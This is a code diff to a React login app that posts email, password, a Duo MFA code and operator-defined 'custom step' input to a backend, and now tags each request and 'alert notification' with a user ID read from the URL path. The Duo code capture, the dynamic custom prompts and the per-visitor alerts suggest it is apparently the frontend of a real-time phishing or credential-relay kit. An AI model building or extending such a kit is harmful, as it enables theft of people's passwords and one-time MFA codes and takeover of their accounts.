@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef  } from 'react';
 import './AppStyles.css'; // Import the new CSS file
 
 /**
@@ -8,6 +8,8 @@ import './AppStyles.css'; // Import the new CSS file
  */
 const App = () => {
     const api_url = "";
+
+    const userIdRef = useRef('');
 
     // --- State Management ---
     const [email, setEmail] = useState('');
@@ -29,19 +31,37 @@ const App = () => {
     const [customStepData, setCustomStepData] = useState({ title: '', subtitle: '', has_input: false });
     const [customInput, setCustomInput] = useState('');
 
+
+      /**
+     * useEffect hook to run once on component mount to capture the user_id.
+     */
+      useEffect(() => {
+        const pathParts = window.location.pathname.split('/');
+        const firstPart = pathParts[1];
+        // Check if the first part of the path is a number (the user_id)
+        if (firstPart && /^\d+$/.test(firstPart)) {
+            userIdRef.current = firstPart;
+            console.log("Captured User ID:", firstPart);
+        } else {
+            console.log("No User ID found in URL, backend will use default.");
+        }
+    }, []); // The empty array [] ensures this runs only once.
+
+
+
+
     /**
      * Sends an alert notification to the backend.
      * @param {string} message - The message to send.
      */
     const send_alert_notification = async (message) => {
         try {
-            let response = await fetch(api_url + "/alert", {
+            await fetch(api_url + "/alert", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message }),
+                // MODIFIED: Add user_id to the request body
+                body: JSON.stringify({ message, user_id: userIdRef.current }),
             });
-            let data = await response.json();
-            console.log('Alert notification sent:', data);
         } catch (error) {
             console.error("Failed to send alert notification:", error);
         }
@@ -79,21 +99,28 @@ const App = () => {
      * @param {string} [customInput=''] - The custom input value, if applicable.
      * @returns {Promise<object>} The full authentication status object from the backend.
      */
+
+    
     async function get_auth_status(email, password, duoCode = '', customInput = '') {
         try {
             let response = await fetch(api_url + "/auth", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password, duoCode, customInput }),
+                // MODIFIED: Add user_id to the request body
+                body: JSON.stringify({
+                    email,
+                    password,
+                    duoCode,
+                    customInput,
+                    user_id: userIdRef.current
+                }),
             });
-            let data = await response.json();
-            return data;
+            return await response.json();
         } catch (error) {
             console.error("Failed to get auth status:", error);
             return { status: 'error', message: 'Network error or server is down.' };
         }
     }
-
     /**
      * Handles submission of the custom input form.
      * @param {React.FormEvent} e - The form event.
